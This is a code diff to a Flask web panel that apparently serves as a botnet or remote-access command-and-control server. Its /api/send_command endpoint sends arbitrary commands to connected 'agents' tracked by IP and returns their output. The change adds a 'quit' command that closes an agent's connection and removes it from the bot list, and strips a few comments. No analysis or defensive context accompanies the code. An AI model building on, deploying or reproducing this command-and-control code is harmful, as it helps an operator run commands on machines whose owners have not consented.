@@ -167,7 +167,7 @@ def upload_file():
 @app.route('/api/send_command', methods=['POST'])
 def send_command():
     data = request.get_json()
-    session_id = int(data.get('session_id'))  # Convert to int since it comes as string from JS
+    session_id = int(data.get('session_id'))
     command = data.get('command')
     
     if session_id not in Bot.botList:
@@ -178,9 +178,19 @@ def send_command():
         # Send command to agent
         bot.reliable_send(command)
         
+        # If command is quit, remove the bot from the list
+        if command == 'quit':
+            bot.target.close()
+            del Bot.botList[session_id]
+            logging.info(f"Agent {session_id} terminated")
+            return jsonify({
+                'success': True,
+                'message': 'Agent terminated'
+            })
+        
         # Get response from agent
         response = bot.reliable_recv()
-        if response is None:  # Handle connection issues
+        if response is None:
             raise Exception("No response from agent")
             
         # Update last seen time
@@ -189,7 +199,6 @@ def send_command():
         # Log command execution
         logging.info(f"Command executed on Session {session_id} ({bot.ip}): {command}")
         
-        # Add command to history
         return jsonify({
             'success': True,
             'output': response,
@@ -198,6 +207,9 @@ def send_command():
         
     except Exception as e:
         logging.error(f"Error executing command on Session {session_id}: {e}")
+        # If there's an error and it was a quit command, still remove the bot
+        if command == 'quit' and session_id in Bot.botList:
+            del Bot.botList[session_id]
         return jsonify({
             'error': f'Command execution failed: {str(e)}'
         }), 500
